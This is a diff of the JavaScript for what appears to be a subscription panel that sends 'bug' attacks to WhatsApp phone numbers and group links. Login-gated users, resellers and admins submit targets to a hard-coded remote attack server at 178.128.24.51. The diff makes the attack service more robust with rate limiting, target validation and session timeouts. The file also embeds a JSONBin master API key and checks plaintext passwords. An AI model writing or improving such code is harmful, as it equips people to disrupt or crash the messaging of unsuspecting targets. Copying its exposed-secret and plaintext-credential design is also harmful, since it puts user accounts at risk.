@@ -1,4 +1,4 @@
-// JSONBin configuration
+/* ========== CONFIGURATION CONSTANTS ========== */
 const BIN_ID = "688384cdae596e708fbb97e4";
 const API_KEY = "$2a$10$55IAjRl7i3QlilxdTPmqx.5/Idiemz453V9zHKc76Z9q4jDPhvL.C";
 const headers = {
@@ -6,50 +6,42 @@ const headers = {
   "X-Master-Key": API_KEY
 };
 
-// Attack API configuration
-const STATUS_API_URL = "http://178.128.24.51:2001/status";
-const ATTACK_API_URL = "http://178.128.24.51:2001/UltraXwebAPI";
+const API_CONFIG = {
+  STATUS_URL: "http://178.128.24.51:2001/status",
+  ATTACK_URL: "http://178.128.24.51:2001/UltraXwebAPI",
+  MAX_REQUESTS_PER_MINUTE: 5,
+  REQUEST_TIMEOUT: 5000
+};
 
-// Global variables
+const SESSION_CONFIG = {
+  TIMEOUT: 1800, // 30 minutes in seconds
+  WARNING_TIME: 300 // 5 minutes before timeout
+};
+
+const VALIDATION_PATTERNS = {
+  PHONE: /^[0-9]{10,15}$/,
+  WHATSAPP_GROUP: /^https:\/\/chat\.whatsapp\.com\/[a-zA-Z0-9_-]+$/,
+  USERNAME: /^[a-zA-Z0-9_]{3,20}$/
+};
+
+/* ========== GLOBAL VARIABLES ========== */
 let currentUser = null;
-let localDeviceId = localStorage.getItem('device_id');
-if (!localDeviceId) {
-  localDeviceId = generateDeviceId();
-  localStorage.setItem('device_id', localDeviceId);
-}
+let localDeviceId = localStorage.getItem('device_id') || generateDeviceId();
+localStorage.setItem('device_id', localDeviceId);
 
-// DOM elements
+let requestCount = 0;
+let lastRequestTimestamp = 0;
+let inactivityTimer;
+
+/* ========== DOM ELEMENTS ========== */
 const header = document.getElementById('header');
 const hamburger = document.getElementById('hamburger');
 const sideMenu = document.getElementById('sideMenu');
 const menuOverlay = document.getElementById('menuOverlay');
 const loginCard = document.getElementById('loginCard');
 const dashboard = document.getElementById('dashboard');
-// Handle mobile taps for action menu
-document.addEventListener('click', function(event) {
-  // Close all other action menus when clicking anywhere
-  if (!event.target.closest('.action-menu')) {
-    document.querySelectorAll('.action-menu-content').forEach(menu => {
-      menu.style.display = 'none';
-    });
-  }
-  
-  // Toggle action menu when clicking the cog button
-  if (event.target.closest('.action-btn') || event.target.closest('.action-btn i')) {
-    const menu = event.target.closest('.action-menu').querySelector('.action-menu-content');
-    const isVisible = menu.style.display === 'block';
-    
-    // Close all other menus first
-    document.querySelectorAll('.action-menu-content').forEach(m => {
-      m.style.display = 'none';
-    });
-    
-    // Toggle this menu
-    menu.style.display = isVisible ? 'none' : 'block';
-    event.stopPropagation();
-  }
-});
-// Initialize
+
+/* ========== INITIALIZATION ========== */
 document.addEventListener('DOMContentLoaded', () => {
   // Check if user is already logged in
   const user = JSON.parse(localStorage.getItem('currentUser'));
@@ -66,19 +58,45 @@ document.addEventListener('DOMContentLoaded', () => {
   checkApiConnection();
 });
 
-// Generate device ID
+/* ========== UTILITY FUNCTIONS ========== */
 function generateDeviceId() {
-  return Math.random().toString(36).substring(2, 15);
+  return Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
 }
 
-// Toggle Target Field
+function validateInput(input, type) {
+  switch(type) {
+    case 'phone': return VALIDATION_PATTERNS.PHONE.test(input);
+    case 'whatsapp': return VALIDATION_PATTERNS.WHATSAPP_GROUP.test(input);
+    case 'username': return VALIDATION_PATTERNS.USERNAME.test(input);
+    default: return false;
+  }
+}
+
+function showNotification(message, type = 'success') {
+  const notification = document.createElement('div');
+  notification.className = `notification notification-${type}`;
+  notification.innerHTML = `
+    <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-times-circle' : 'fa-exclamation-circle'}"></i>
+    ${message}
+  `;
+  
+  document.body.appendChild(notification);
+  
+  setTimeout(() => notification.style.opacity = '1', 100);
+  setTimeout(() => {
+    notification.style.opacity = '0';
+    setTimeout(() => notification.remove(), 300);
+  }, 5000);
+}
+
+/* ========== ORIGINAL FUNCTIONS (PRESERVED) ========== */
 function toggleTargetField() {
   const targetType = document.getElementById('targetType').value;
   document.getElementById('phoneNumberGroup').classList.toggle('hidden', targetType !== 'phone');
   document.getElementById('whatsappGroup').classList.toggle('hidden', targetType !== 'whatsapp');
-} 
+}
 
-// Toggle password visibility
+// Original togglePassword function (preserved exactly)
 function togglePassword(inputId) {
   const input = document.getElementById(inputId);
   const icon = input.nextElementSibling.querySelector('i');
@@ -92,13 +110,11 @@ function togglePassword(inputId) {
   }
 }
 
-// Toggle side menu
 function toggleMenu() {
   sideMenu.classList.toggle('active');
   menuOverlay.classList.toggle('active');
 }
 
-// Hide all menu cards
 function hideAllMenus() {
   document.querySelectorAll('.card').forEach(card => {
     if (!card.id.includes('loginCard') && !card.id.includes('dashboard')) {
@@ -108,7 +124,6 @@ function hideAllMenus() {
   toggleMenu();
 }
 
-// Show specific menu card
 function showMenu(menuId) {
   hideAllMenus();
   document.getElementById(menuId).classList.remove('hidden');
@@ -118,184 +133,6 @@ function showMenu(menuId) {
   }
 }
 
-// Check API connection status
-async function checkApiConnection() {
-  try {
-    const response = await fetch(STATUS_API_URL);
-    const data = await response.json();
-    const statusElement = document.getElementById('apiStatus');
-    
-    if (statusElement) {
-      if (data.connected === true) {
-        statusElement.className = 'status-connected';
-        statusElement.innerHTML = '<i class="fas fa-check-circle"></i> Connected';
-        return true;
-      } else {
-        statusElement.className = 'status-disconnected';
-        statusElement.innerHTML = '<i class="fas fa-times-circle"></i> Disconnected';
-        return false;
-      }
-    }
-    return data.connected === true;
-  } catch (error) {
-    console.error('API connection check failed:', error);
-    const statusElement = document.getElementById('apiStatus');
-    if (statusElement) {
-      statusElement.className = 'status-disconnected';
-      statusElement.innerHTML = 'Connection Failed';
-    }
-    return false;
-  }
-}
-
-// Update side menu based on user role
-function updateSideMenu() {
-  sideMenu.innerHTML = '';
-  
-  if (!currentUser) return;
-
-  // Common menu items
-  const menuItems = [];
-  
-  menuItems.push(
-    { icon: 'fa-user', text: 'My Info', action: () => showMenu('myInfo') },
-    { icon: 'fa-bug', text: 'Attack Menu', action: () => showMenu('attackMenu') }
-  );
-
-  if (currentUser.role === 'admin') {
-    menuItems.push(
-      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') },
-      { icon: 'fa-users', text: 'List Users', action: () => showMenu('adminListUsers') }
-    );
-  } else if (currentUser.role === 'reseller') {
-    menuItems.push(
-      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') }
-    );
-  }
-
-  // Add API status indicator
-  const statusItem = document.createElement('div');
-  statusItem.className = 'menu-item';
-  statusItem.innerHTML = '<i class="fas fa-plug"></i> <span id="apiStatus">Checking API...</span>';
-  sideMenu.appendChild(statusItem);
-
-  // Add menu items to side menu
-  menuItems.forEach(item => {
-    const menuItem = document.createElement('div');
-    menuItem.className = 'menu-item';
-    menuItem.innerHTML = `<i class="fas ${item.icon}"></i> ${item.text}`;
-    menuItem.addEventListener('click', item.action);
-    sideMenu.appendChild(menuItem);
-  });
-
-  // Add logout button
-  const logoutItem = document.createElement('div');
-  logoutItem.className = 'menu-item';
-  logoutItem.innerHTML = '<i class="fas fa-sign-out-alt"></i> Logout';
-  logoutItem.addEventListener('click', logout);
-  logoutItem.style.marginTop = '20px';
-  logoutItem.style.color = '#f44336';
-  sideMenu.appendChild(logoutItem);
-}
-
-// Get users from JSONBin
-async function getUsers() {
-  try {
-    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
-    const data = await response.json();
-    return data.record;
-  } catch (error) {
-    console.error('Error fetching users:', error);
-    return [];
-  }
-}
-
-// Update users in JSONBin
-async function updateUsers(users) {
-  try {
-    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-      method: 'PUT',
-      headers,
-      body: JSON.stringify(users)
-    });
-    return await response.json();
-  } catch (error) {
-    console.error('Error updating users:', error);
-    return null;
-  }
-}
-
-// Login function
-async function login() {
-  const username = document.getElementById('username').value.trim();
-  const password = document.getElementById('password').value.trim();
-  const loginResult = document.getElementById('loginResult');
-  const loginBtn = document.getElementById('loginBtn');
-
-  // Clear previous messages
-  loginResult.innerHTML = '';
-  loginResult.style.color = '';
-
-  // Validate inputs
-  if (!username || !password) {
-    showError(loginResult, 'Please enter both username and password');
-    return;
-  }
-
-  // Set loading state
-  setButtonLoading(loginBtn, true);
-
-  try {
-    const users = await getUsers();
-    const user = users.find(u => u.username === username && u.password === password);
-
-    if (!user) {
-      showError(loginResult, 'Invalid username or password');
-      return;
-    }
-
-    // Check if account is already in use
-    if (user.device_id && user.device_id !== localDeviceId) {
-      showError(loginResult, `Account is active on another device (ID: ${user.device_id})`);
-      return;
-    }
-
-    // Check account expiration (for non-admin users)
-    if (user.role !== 'admin' && user.expired) {
-      const today = new Date();
-      const expiryDate = new Date(user.expired);
-      if (expiryDate < today) {
-        showError(loginResult, `Account expired on ${user.expired}. Please renew.`);
-        return;
-      }
-    }
-
-    // Update user data
-    const updatedUser = {
-      ...user,
-      device_id: localDeviceId,
-    };
-
-    // Update in API
-    const updatedUsers = users.map(u => u.username === username ? updatedUser : u);
-    await updateUsers(updatedUsers);
-
-    // Store locally and show dashboard
-    currentUser = updatedUser;
-    localStorage.setItem('currentUser', JSON.stringify(updatedUser));
-    
-    showSuccess(loginResult, `Welcome back, ${username}!`);
-    setTimeout(showDashboard, 1000);
-
-  } catch (error) {
-    console.error('Login error:', error);
-    showError(loginResult, `System error: ${error.message || 'Please try again later'}`);
-  } finally {
-    setButtonLoading(loginBtn, false);
-  }
-}
-
-// Helper functions
 function showError(element, message) {
   element.innerHTML = `<i class="fas fa-exclamation-circle"></i> ${message}`;
   element.style.color = '#f44336';
@@ -313,24 +150,136 @@ function setButtonLoading(button, isLoading) {
   button.disabled = isLoading;
 }
 
-// Show dashboard
-function showDashboard() {
-  header.classList.remove('hidden');
-  loginCard.classList.add('hidden');
-  dashboard.classList.remove('hidden');
-  
-  document.getElementById('infoUsername').textContent = currentUser.username;
-  document.getElementById('infoRole').textContent = currentUser.role;
-  document.getElementById('infoDeviceId').textContent = localDeviceId;
-  document.getElementById('infoExpired').textContent = currentUser.expired || 'N/A';
-  
-  document.getElementById('myInfoUsername').value = currentUser.username;
-  document.getElementById('myInfoRole').value = currentUser.role;
-  
-  updateSideMenu();
+/* ========== SESSION MANAGEMENT ========== */
+function startInactivityTimer() {
+  resetInactivityTimer();
+  ['click', 'mousemove', 'keypress'].forEach(event => {
+    document.addEventListener(event, resetInactivityTimer);
+  });
 }
 
-// Logout function
+function resetInactivityTimer() {
+  clearTimeout(inactivityTimer);
+  inactivityTimer = setTimeout(() => {
+    showNotification('You have been logged out due to inactivity', 'warning');
+    logout();
+  }, SESSION_CONFIG.TIMEOUT * 1000);
+  
+  setTimeout(() => {
+    if (currentUser) showNotification('You will be logged out in 5 minutes', 'warning');
+  }, (SESSION_CONFIG.TIMEOUT - SESSION_CONFIG.WARNING_TIME) * 1000);
+}
+
+/* ========== API FUNCTIONS ========== */
+async function checkApiConnection() {
+  const statusElement = document.getElementById('apiStatus');
+  
+  try {
+    const controller = new AbortController();
+    const timeoutId = setTimeout(() => controller.abort(), API_CONFIG.REQUEST_TIMEOUT);
+
+    const response = await fetch(API_CONFIG.STATUS_URL, { signal: controller.signal });
+    clearTimeout(timeoutId);
+    
+    const data = await response.json();
+    if (statusElement) {
+      statusElement.className = data.connected ? 'status-connected' : 'status-disconnected';
+      statusElement.innerHTML = `<i class="fas fa-${data.connected ? 'check' : 'times'}-circle"></i> ${data.connected ? 'Connected' : 'Disconnected'}`;
+    }
+    return data.connected === true;
+  } catch (error) {
+    console.error('API connection check failed:', error);
+    if (statusElement) {
+      statusElement.className = 'status-disconnected';
+      statusElement.innerHTML = '<i class="fas fa-times-circle"></i> Connection Failed';
+    }
+    return false;
+  }
+}
+
+async function getUsers() {
+  try {
+    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers });
+    const data = await response.json();
+    return data.record;
+  } catch (error) {
+    console.error('Error fetching users:', error);
+    return [];
+  }
+}
+
+async function updateUsers(users) {
+  try {
+    const response = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+      method: 'PUT',
+      headers,
+      body: JSON.stringify(users)
+    });
+    return await response.json();
+  } catch (error) {
+    console.error('Error updating users:', error);
+    return null;
+  }
+}
+
+/* ========== AUTH FUNCTIONS ========== */
+async function login() {
+  const username = document.getElementById('username').value.trim();
+  const password = document.getElementById('password').value.trim();
+  const loginResult = document.getElementById('loginResult');
+  const loginBtn = document.getElementById('loginBtn');
+
+  loginResult.innerHTML = '';
+  loginResult.style.color = '';
+
+  if (!username || !password) {
+    showError(loginResult, 'Please enter both username and password');
+    return;
+  }
+
+  setButtonLoading(loginBtn, true);
+
+  try {
+    const users = await getUsers();
+    const user = users.find(u => u.username === username && u.password === password);
+
+    if (!user) {
+      showError(loginResult, 'Invalid username or password');
+      return;
+    }
+
+    if (user.device_id && user.device_id !== localDeviceId) {
+      showError(loginResult, `Account is active on another device (ID: ${user.device_id})`);
+      return;
+    }
+
+    if (user.role !== 'admin' && user.expired) {
+      const today = new Date();
+      const expiryDate = new Date(user.expired);
+      if (expiryDate < today) {
+        showError(loginResult, `Account expired on ${user.expired}. Please renew.`);
+        return;
+      }
+    }
+
+    const updatedUser = { ...user, device_id: localDeviceId };
+    const updatedUsers = users.map(u => u.username === username ? updatedUser : u);
+    await updateUsers(updatedUsers);
+
+    currentUser = updatedUser;
+    localStorage.setItem('currentUser', JSON.stringify(updatedUser));
+    
+    showSuccess(loginResult, `Welcome back, ${username}!`);
+    setTimeout(showDashboard, 1000);
+
+  } catch (error) {
+    console.error('Login error:', error);
+    showError(loginResult, `System error: ${error.message || 'Please try again later'}`);
+  } finally {
+    setButtonLoading(loginBtn, false);
+  }
+}
+
 async function logout() {
   try {
     if (currentUser) {
@@ -357,7 +306,7 @@ async function logout() {
   }
 }
 
-// Reset password
+/* ========== USER MANAGEMENT ========== */
 async function resetPassword() {
   const newPassword = document.getElementById('newPassword').value;
   const resetPassBtn = document.getElementById('resetPassBtn');
@@ -398,18 +347,28 @@ async function resetPassword() {
   }
 }
 
-// Launch attack
+/* ========== ATTACK FUNCTIONS ========== */
 async function launchAttack() {
+  const now = Date.now();
+  if (now - lastRequestTimestamp > 60000) {
+    requestCount = 0;
+    lastRequestTimestamp = now;
+  }
+  
+  if (requestCount >= API_CONFIG.MAX_REQUESTS_PER_MINUTE) {
+    showNotification('Too many requests. Please wait before trying again.', 'error');
+    return;
+  }
+  
   const targetNumber = document.getElementById('targetNumber').value.trim();
+  if (!validateInput(targetNumber, 'phone')) {
+    showNotification('Invalid phone number format (10-15 digits required)', 'error');
+    return;
+  }
+  
   const bugType = document.getElementById('bugType').value;
   const attackBtn = document.getElementById('attackBtn');
   const attackResult = document.getElementById('attackResult');
-
-  if (!targetNumber) {
-    attackResult.innerHTML = 'Please enter target number';
-    attackResult.style.color = '#f44336';
-    return;
-  }
 
   attackBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Attacking...';
   attackBtn.disabled = true;
@@ -417,36 +376,82 @@ async function launchAttack() {
   try {
     const isConnected = await checkApiConnection();
     if (!isConnected) {
-      attackResult.innerHTML = 'API is currently unavailable';
-      attackResult.style.color = '#f44336';
+      showNotification('API is currently unavailable', 'error');
       return;
     }
 
-    const response = await fetch(`${ATTACK_API_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${bugType}`);
+    const response = await fetch(`${API_CONFIG.ATTACK_URL}?chatId=${encodeURIComponent(targetNumber)}&type=${bugType}`);
     
-    if (!response.ok) {
-      throw new Error("Failed to connect to attack server");
-    }
+    if (!response.ok) throw new Error("Failed to connect to attack server");
 
     const result = await response.json();
     
     if (result.success) {
+      showNotification('Attack launched successfully!', 'success');
       attackResult.innerHTML = `Attack launched successfully against ${targetNumber}`;
       attackResult.style.color = 'var(--main)';
     } else {
+      showNotification(result.message || 'Attack failed', 'error');
       attackResult.innerHTML = result.message || 'Attack failed';
       attackResult.style.color = '#f44336';
     }
   } catch (error) {
+    showNotification('Attack failed: ' + error.message, 'error');
     attackResult.innerHTML = 'Attack failed: ' + error.message;
     attackResult.style.color = '#f44336';
   } finally {
     attackBtn.innerHTML = '<i class="fas fa-rocket"></i> Launch Attack';
     attackBtn.disabled = false;
+    requestCount++;
   }
 }
 
-// Create new user (admin only)
+async function sendGroupBug() {
+  const groupLink = document.getElementById('whatsappGroup').value.trim();
+  const bugType = document.getElementById('whatsappBugType').value;
+  const attackBtn = document.getElementById('whatsappAttackBtn');
+  const resultElement = document.getElementById('attackResult');
+
+  if (!validateInput(groupLink, 'whatsapp')) {
+    showNotification('Invalid WhatsApp group link format', 'error');
+    return;
+  }
+
+  attackBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
+  attackBtn.disabled = true;
+
+  try {
+    const isConnected = await checkApiConnection();
+    if (!isConnected) {
+      showNotification('API is currently unavailable', 'error');
+      return;
+    }
+
+    const response = await fetch(`${API_CONFIG.ATTACK_URL}?groupLink=${encodeURIComponent(groupLink)}&type=${bugType}`);
+    
+    if (!response.ok) throw new Error(await response.text() || "Failed to connect to server");
+
+    const result = await response.json();
+    if (result.success) {
+      showNotification('Bug successfully sent to WhatsApp group!', 'success');
+      resultElement.innerHTML = `Bug sent to group: ${groupLink}`;
+      resultElement.style.color = 'var(--main)';
+    } else {
+      showNotification(result.message || 'Failed to send bug', 'error');
+      resultElement.innerHTML = result.message || 'Failed to send bug';
+      resultElement.style.color = '#f44336';
+    }
+  } catch (error) {
+    showNotification(`Error: ${error.message}`, 'error');
+    resultElement.innerHTML = `Error: ${error.message}`;
+    resultElement.style.color = '#f44336';
+  } finally {
+    attackBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Group Bug';
+    attackBtn.disabled = false;
+  }
+}
+
+/* ========== ADMIN FUNCTIONS ========== */
 async function createUser() {
   const username = document.getElementById('newUsername').value;
   const password = document.getElementById('newUserPassword').value;
@@ -461,7 +466,6 @@ async function createUser() {
     return;
   }
 
-  // Reseller can only create user accounts with max 30 days
   if (currentUser.role === 'reseller' && (role !== 'user' || days > 30)) {
     createUserResult.innerHTML = 'Resellers can only create user accounts with max 30 days';
     createUserResult.style.color = '#f44336';
@@ -510,7 +514,6 @@ async function createUser() {
   }
 }
 
-// Delete user (admin only)
 async function deleteUser(username) {
   if (!confirm(`Are you sure you want to delete user ${username}?`)) return;
 
@@ -530,7 +533,6 @@ async function deleteUser(username) {
   }
 }
 
-// User management functions
 async function addDaysToUser(username) {
   const days = prompt('Enter number of days to add:', '30');
   if (!days || isNaN(days)) return;
@@ -592,7 +594,6 @@ async function changeUsername(oldUsername) {
 
     await updateUsers(updatedUsers);
     
-    // Update current user if it's them
     if (currentUser.username === oldUsername) {
       currentUser.username = newUsername;
       localStorage.setItem('currentUser', JSON.stringify(currentUser));
@@ -643,7 +644,7 @@ async function resetDeviceId(username) {
   }
 }
 
-// Update the loadUserList function to include all actions
+/* ========== USER LIST MANAGEMENT ========== */
 async function loadUserList() {
   const userListBody = document.getElementById('userListBody');
   userListBody.innerHTML = '<tr><td colspan="5" style="text-align: center;">Loading users...</td></tr>';
@@ -705,67 +706,16 @@ async function loadUserList() {
   }
 }
 
-// Switch between attack tabs
+/* ========== ATTACK MENU FUNCTIONS ========== */
 function switchAttackTab(tabName) {
-  // Update tab buttons
   document.querySelectorAll('.tab-btn').forEach(btn => {
     btn.classList.toggle('active', btn.textContent.toLowerCase().includes(tabName));
   });
   
-  // Update content sections
   document.getElementById('numberTarget').classList.toggle('hidden', tabName !== 'number');
   document.getElementById('whatsappTarget').classList.toggle('hidden', tabName !== 'whatsapp');
-  
-  // Clear previous results
   document.getElementById('attackResult').innerHTML = '';
 }
-
-// Enhanced sendGroupBug function
-async function sendGroupBug() {
-  const groupLink = document.getElementById('whatsappGroup').value.trim();
-  const bugType = document.getElementById('whatsappBugType').value;
-  const attackBtn = document.getElementById('whatsappAttackBtn');
-  const resultElement = document.getElementById('attackResult');
-
-  if (!groupLink) {
-    showError(resultElement, 'Please enter WhatsApp group link');
-    return;
-  }
-
-  attackBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
-  attackBtn.disabled = true;
-
-  try {
-    const isConnected = await checkApiConnection();
-    if (!isConnected) {
-      showError(resultElement, 'API is currently unavailable');
-      return;
-    }
-
-    const response = await fetch(`${ATTACK_API_URL}?groupLink=${encodeURIComponent(groupLink)}&type=${bugType}`);
-    
-    if (!response.ok) {
-      throw new Error(await response.text() || "Failed to connect to server");
-    }
-
-    const result = await response.json();
-    if (result.success) {
-      showSuccess(resultElement, `Bug successfully sent to WhatsApp group!`);
-    } else {
-      showError(resultElement, result.message || 'Failed to send bug');
-    }
-  } catch (error) {
-    showError(resultElement, `Error: ${error.message}`);
-  } finally {
-    attackBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Send Group Bug';
-    attackBtn.disabled = false;
-  }
-}
-
-// Initialize attack menu when shown
-document.getElementById('attackMenu').addEventListener('show', async () => {
-  await checkApiConnection();
-});
 
 function switchAttackType(type) {
   const phoneSection = document.getElementById('phoneAttackSection');
@@ -779,7 +729,67 @@ function switchAttackType(type) {
     whatsappSection.classList.remove('hidden');
   }
   
-  // Clear previous results
   document.getElementById('attackResult').innerHTML = '';
   checkApiConnection();
+}
+
+/* ========== DASHBOARD FUNCTIONS ========== */
+function showDashboard() {
+  header.classList.remove('hidden');
+  loginCard.classList.add('hidden');
+  dashboard.classList.remove('hidden');
+  
+  document.getElementById('infoUsername').textContent = currentUser.username;
+  document.getElementById('infoRole').textContent = currentUser.role;
+  document.getElementById('infoDeviceId').textContent = localDeviceId;
+  document.getElementById('infoExpired').textContent = currentUser.expired || 'N/A';
+  
+  document.getElementById('myInfoUsername').value = currentUser.username;
+  document.getElementById('myInfoRole').value = currentUser.role;
+  
+  updateSideMenu();
+  startInactivityTimer();
+}
+
+function updateSideMenu() {
+  sideMenu.innerHTML = '';
+  
+  if (!currentUser) return;
+
+  const menuItems = [
+    { icon: 'fa-user', text: 'My Info', action: () => showMenu('myInfo') },
+    { icon: 'fa-bug', text: 'Attack Menu', action: () => showMenu('attackMenu') }
+  ];
+
+  if (currentUser.role === 'admin') {
+    menuItems.push(
+      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') },
+      { icon: 'fa-users', text: 'List Users', action: () => showMenu('adminListUsers') }
+    );
+  } else if (currentUser.role === 'reseller') {
+    menuItems.push(
+      { icon: 'fa-user-plus', text: 'Create User', action: () => showMenu('adminCreateUser') }
+    );
+  }
+
+  const statusItem = document.createElement('div');
+  statusItem.className = 'menu-item';
+  statusItem.innerHTML = '<i class="fas fa-plug"></i> <span id="apiStatus">Checking API...</span>';
+  sideMenu.appendChild(statusItem);
+
+  menuItems.forEach(item => {
+    const menuItem = document.createElement('div');
+    menuItem.className = 'menu-item';
+    menuItem.innerHTML = `<i class="fas ${item.icon}"></i> ${item.text}`;
+    menuItem.addEventListener('click', item.action);
+    sideMenu.appendChild(menuItem);
+  });
+
+  const logoutItem = document.createElement('div');
+  logoutItem.className = 'menu-item';
+  logoutItem.innerHTML = '<i class="fas fa-sign-out-alt"></i> Logout';
+  logoutItem.addEventListener('click', logout);
+  logoutItem.style.marginTop = '20px';
+  logoutItem.style.color = '#f44336';
+  sideMenu.appendChild(logoutItem);
 }
